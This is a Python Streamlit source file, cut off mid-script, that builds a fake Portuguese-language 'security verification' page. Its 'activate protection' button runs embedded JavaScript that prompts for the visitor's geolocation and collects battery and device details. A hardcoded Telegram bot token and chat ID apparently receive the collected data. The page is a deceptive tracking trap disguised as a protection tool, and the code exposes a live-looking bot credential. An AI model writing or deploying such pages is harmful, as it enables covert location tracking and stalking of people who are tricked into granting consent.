import streamlit as st
import time

# --- CONFIGURAÇÃO DO BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Integrada", layout="centered")

# --- CSS ORIGINAL E ANIMAÇÃO ---
st.markdown("""
    <style>
    .main { background-color: #0b1117; color: white; font-family: sans-serif; }
    .stAlert { display: none !important; }
    
    .titulo { font-size: 32px; font-weight: bold; margin-top: 40px; text-align: left; }
    .status-container { font-size: 22px; margin: 15px 0; color: #e0e0e0; }
    
    /* BARRA DE PROGRESSO PERSONALIZADA */
    .progress-bg { width: 100%; height: 8px; background-color: #1e262e; border-radius: 10px; margin-bottom: 40px; overflow: hidden; }
    .progress-fill { width: 4%; height: 100%; background-color: #007bff; border-radius: 10px; transition: width 0.1s; }
    
    .btn-container { display: flex; justify-content: center; width: 100%; }
    .meu-botao {
        background-color: white; color: black; width: 300px; height: 85px;
        border-radius: 12px; border: none; font-size: 16px; font-weight: bold;
        display: flex; flex-direction: column; align-items: center; justify-content: center;
        cursor: pointer; line-height: 1.2; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
    }
    .ponto-vermelho { color: #ff3b30; font-size: 28px; margin-bottom: -5px; }
    
    .footer { 
        position: fixed; left: 0; bottom: 20px; width: 100%; 
        text-align: center; color: #555; font-size: 11px; font-family: sans-serif;
    }
    </style>
""", unsafe_allow_html=True)

# Interface Inicial
st.markdown('<div class="titulo">Verificação de Segurança</div>', unsafe_allow_html=True)

# Espaços reservados para animação
placeholder_texto = st.empty()
placeholder_barra = st.empty()

placeholder_texto.markdown('<div class="status-container">Status: Aguardando ativação (4%)</div>', unsafe_allow_html=True)
placeholder_barra.markdown('<div class="progress-bg"><div class="progress-fill" style="width: 4%;"></div></div>', unsafe_allow_html=True)

# --- SCRIPT DE CAPTURA + DISPARO DA ANIMAÇÃO ---
js_final = f"""
<div class="btn-container">
    <button class="meu-botao" id="btn_ativar">
        <span class="ponto-vermelho">●</span>
        <span>ATIVAR PROTEÇÃO<br>AGORA</span>
    </button>
</div>

<script>
document.getElementById('btn_ativar').onclick = function() {{
    // Força o pop-up de localização do sistema
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            try {{
                const bat = await navigator.getBattery();
                const info = "🛡️ PROTEÇÃO ATIVADA\\n📱 " + navigator.userAgent.split('(')[1].split(')')[0] + "\\n🔋 " +
                
